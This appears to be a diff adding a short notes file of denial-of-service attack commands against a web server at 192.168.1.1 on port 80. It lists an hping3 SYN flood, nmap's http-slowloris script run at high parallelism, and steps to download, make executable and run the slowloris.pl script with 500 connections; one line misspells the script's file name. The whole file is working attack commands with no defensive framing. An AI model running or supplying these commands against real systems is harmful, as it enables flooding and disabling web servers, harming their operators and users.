@@ -1,0 +1,10 @@
+hping3 -i u100 -S -p 80 192.168.1.1
+
+nmap --script http-slowloris --max-parallelism 400 192.168.1.1 -vv
+
+http://ha.ckers.org/slowloris/
+Download slowlans.pl
+nano slowloris.pl
+chmod +x slowloris.pl
+./slowloris.pl -dns 192.168.1.1 -port 80 -num 500
+
